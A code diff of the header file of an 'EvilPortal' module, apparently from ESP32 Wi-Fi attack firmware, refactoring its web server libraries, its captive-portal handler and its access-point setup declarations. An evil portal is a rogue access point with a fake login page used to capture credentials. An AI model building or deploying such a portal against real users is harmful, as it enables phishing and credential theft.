@@ -3,8 +3,8 @@
 #ifndef EvilPortal_h
 #define EvilPortal_h
 
-#include "ESPAsyncWebServer.h"
-#include <AsyncTCP.h>
+#include <WiFi.h>
+#include <WebServer.h>
 #include <DNSServer.h>
 
 #include "configs.h"
@@ -36,8 +36,8 @@ extern Buffer buffer_obj;
 #define MAX_AP_NAME_SIZE 30
 #define WIFI_SCAN_EVIL_PORTAL 30
 
-char apName[MAX_AP_NAME_SIZE] = "PORTAL";
-char index_html[MAX_HTML_SIZE] = "TEST";
+extern char apName[MAX_AP_NAME_SIZE];
+extern char index_html[MAX_HTML_SIZE];
 
 struct ssid {
   String essid;
@@ -56,17 +56,7 @@ struct AccessPoint {
   LinkedList<uint8_t>* stations;
 };
 
-class CaptiveRequestHandler : public AsyncWebHandler {
-public:
-  CaptiveRequestHandler() {}
-  virtual ~CaptiveRequestHandler() {}
-
-  bool canHandle(AsyncWebServerRequest *request) { return true; }
-
-  void handleRequest(AsyncWebServerRequest *request) {
-    request->send_P(200, "text/html", index_html);
-  }
-};
+// Captive portal handler moved to setupServer() logic
 
 class EvilPortal {
 
@@ -88,9 +78,10 @@ class EvilPortal {
     bool setHtml();
     bool setAP(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points);
     void setupServer();
-    void startPortal();
+    void startPortal(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points);
     void startAP();
     void sendToDisplay(String msg);
+    String getSHA256(String data);
 
   public:
     EvilPortal();
